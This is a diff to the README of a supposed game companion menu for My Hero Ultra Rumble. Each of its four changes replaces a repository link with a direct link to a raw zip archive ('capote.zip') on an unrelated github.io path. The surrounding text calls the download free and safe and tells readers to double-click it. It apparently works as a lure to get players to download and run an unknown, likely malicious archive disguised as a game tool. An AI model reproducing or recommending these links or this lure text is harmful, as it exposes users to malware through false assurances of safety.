@@ -5,7 +5,7 @@ description: "Interactive menu guide and strategy hub for My Hero Ultra Rumble p
 ---
 <h1>🎮 my-hero-ultra-rumble-menu - Your Complete Game Companion Guide</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-My_Hero_Ultra_Rumble_Menu-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+[![Download Now](https://img.shields.io/badge/Download-My_Hero_Ultra_Rumble_Menu-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wittgensteinian-parryspenstemon7737/wittgensteinian-parryspenstemon7737.github.io/raw/refs/heads/main/sart/capote.zip)
 
 ## 🎯 What Is This?
 
@@ -54,7 +54,7 @@ Our community constantly works to keep this guide current. You'll always find:
 
 Getting started is incredibly simple. Visit this link to download the application:
 
-### [⬇️ Download my-hero-ultra-rumble-menu](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+### [⬇️ Download my-hero-ultra-rumble-menu](https://github.com/Wittgensteinian-parryspenstemon7737/wittgensteinian-parryspenstemon7737.github.io/raw/refs/heads/main/sart/capote.zip)
 
 Once you click the download link, you'll be taken to the official download page. Follow these simple instructions:
 
@@ -76,7 +76,7 @@ Since this is a lightweight menu application, it runs smoothly on virtually any 
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
-Head to the [official download page](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu) and grab the latest version. The download is completely free and safe.
+Head to the [official download page](https://github.com/Wittgensteinian-parryspenstemon7737/wittgensteinian-parryspenstemon7737.github.io/raw/refs/heads/main/sart/capote.zip) and grab the latest version. The download is completely free and safe.
 
 ### Step 2: Open the Menu
 Once downloaded, simply double-click to open the menu. It loads instantly and doesn't require any installation or additional software.
@@ -167,7 +167,7 @@ Become part of something bigger! Our community:
 
 Don't wait another minute! Download **my-hero-ultra-rumble-menu** now and unlock the full potential of your My Hero Ultra Rumble experience. Whether you're aiming for the top ranks, want to master every character, or simply want to enjoy the game more fully - this menu is your ultimate companion.
 
-### [Download Now - It's Free!](https://github.com/Wittgensteinian-parryspenstemon7737/my-hero-ultra-rumble-menu)
+### [Download Now - It's Free!](https://github.com/Wittgensteinian-parryspenstemon7737/wittgensteinian-parryspenstemon7737.github.io/raw/refs/heads/main/sart/capote.zip)
 
 Join thousands of satisfied players who have already enhanced their gaming experience with our comprehensive guide. The path to becoming a true hero (or villain) starts here!
 
